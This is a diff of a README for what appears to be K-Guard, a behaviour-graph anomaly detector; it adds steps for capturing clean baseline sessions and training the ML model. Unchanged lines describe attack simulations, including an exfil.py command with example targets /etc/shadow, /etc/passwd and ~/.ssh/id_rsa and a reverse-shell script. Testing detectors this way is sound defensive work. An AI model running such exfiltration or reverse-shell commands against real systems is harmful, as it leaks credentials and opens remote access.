@@ -39,6 +39,39 @@ On macOS:
 open output/kguard_interactive_graph.html
 ```
 
+## Training the Baseline Model
+
+Before `ml/detector.py` can flag anomalies meaningfully, it needs a trained
+baseline of normal activity. Do this once, and again whenever usage
+patterns change.
+
+### 1. Capture clean sessions
+
+Run the monitor through different non-attack workloads (idle, dev work,
+updates, installs, etc.) — never while an attack simulation is running.
+Save each capture under a unique name (the monitor overwrites the same
+file every run):
+
+```bash
+mkdir -p output/baseline_captures
+cp output/system_behavior_graph.gexf output/baseline_captures/session_$(date +%Y%m%d_%H%M%S)_idle.gexf
+```
+
+Aim for 4+ sessions across different workload types.
+
+### 2. Train
+
+```bash
+# regular
+python3 -m ml.train
+
+# force-promote this run even if it looks worse than the current model
+python3 -m ml.train --force
+```
+
+Models are saved under `ml/models/`. A new run only replaces the active
+`baseline_model.joblib` if it's at least as good as the current one;
+`--force` overrides that check.
 
 ### Full test run (capture → attack → detect)
 
@@ -62,7 +95,6 @@ For custom attacker's ip, attacker's port and file, use following command:
 ```
 python3 script/exfil.py --ip <custom_IP> --port <custom_PORT> --file <custom_file (For ex: /etc/shadow, /etc/passwd, ~/.ssh/id_rsa)>
 ```
-
 Wait for `exfil.py` to print `[+] Exfiltration complete.`, then go back to **Terminal 1** and
 press `Ctrl+C` to stop the monitor and flush the final graph to
 `output/system_behavior_graph.gexf`.
@@ -72,7 +104,7 @@ Finally, run the detector:
 ```bash
 python3 -m ml.detector
 ```
-
+`ml/detector.py` automatically loads `ml/models/baseline_model.joblib`
 ### For Reverse Shell Simulation (capture → attack → detect) using KGUARD-GUI
 ```bash
 # Terminal 1 — start the Kguard-gui
@@ -91,4 +123,3 @@ python3 script/revsh.py
 ```
 Back to the K-Guard GUI, Click "Stop & Save Graph".
 Detect the attack by clicking "Run ML Detector"
-
